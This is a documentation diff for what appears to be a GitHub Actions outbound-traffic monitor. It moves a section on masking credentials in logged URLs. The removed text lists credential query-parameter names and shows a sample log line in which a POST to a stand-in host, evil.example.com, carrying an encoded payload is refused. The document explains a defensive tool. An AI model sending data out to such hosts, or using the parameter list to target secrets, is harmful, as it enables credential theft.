@@ -118,7 +118,8 @@ Paste that allowlist into the setup step and switch the mode:
 Each rule names the methods it permits, so this one lets npm fetch packages without letting it
 publish any: a `POST` to the same host is refused, as is every host not listed. Whatever is refused
 is listed under **Blocked Hosts** with the reason, and **Communication details** names the URL of
-every request, allowed or refused:
+every request, allowed or refused, with credential query parameters replaced (see
+[Credentials in a URL](docs/security.md#credentials-in-a-url)):
 
 <img src="assets/report-inspect-restrict-mode.png" alt="Outbound Traffic Report - restrict mode" width="556">
 
@@ -513,35 +514,6 @@ fails the step.
 Naming the service name in an `allowed_*` rule also clears the row, but it is the misleading option:
 it reads as permission to reach something that nothing can connect to, and the record still does not
 resolve.
-
-### Credentials in a URL
-
-Under `inspect`, **Communication details** and the job log print the URL of every request, so a
-credential written into a query string reaches everyone who can read the run. GitHub masks the
-values it knows as workflow secrets, which leaves the ones it does not: a presigned URL's signature,
-a token minted during the build, or a secret whose URL-encoded form no longer matches what was
-registered.
-
-The value of a query parameter named `access_token`, `api_key`, `apikey`, `auth`, `client_secret`,
-`code`, `id_token`, `key`, `password`, `private_token`, `refresh_token`, `secret`, `sig`,
-`signature`, `token`, `x-amz-security-token`, `x-amz-signature` or `x-goog-signature` is therefore
-replaced, whatever its case:
-
-```
-✅ 00:04.212: GET https://cdn.example.com/x.tar.gz?X-Amz-Signature=***&X-Amz-Expires=3600 -> 200 (4.1MB)
-🚫 00:05.003: POST https://evil.example.com/?d=BASE64PAYLOAD -> not-allowed
-```
-
-Everything else is printed as it was sent, parameter names included, so most of what a refused
-request tried to send is still there. Three things this does not cover: a credential in the path,
-which `allowed_url_rules` is written against and so cannot be hidden; one in a parameter the list
-does not name; and the [`explicit` engine](docs/explicit-engine.md), which is deprecated and prints
-its own URLs unchanged. It also replaces an exfiltration payload the sender happened to name `code`
-or `key`. The [traffic artifact](#traffic-artifact) keeps every value verbatim, and is where such a
-payload is read.
-
-An `allowed_url_rules` block suggested by an audit run never carries a query at all: rules match on
-the path, and a recorded query is as likely to hold a one-off token as anything reusable.
 
 ### Traffic artifact
 
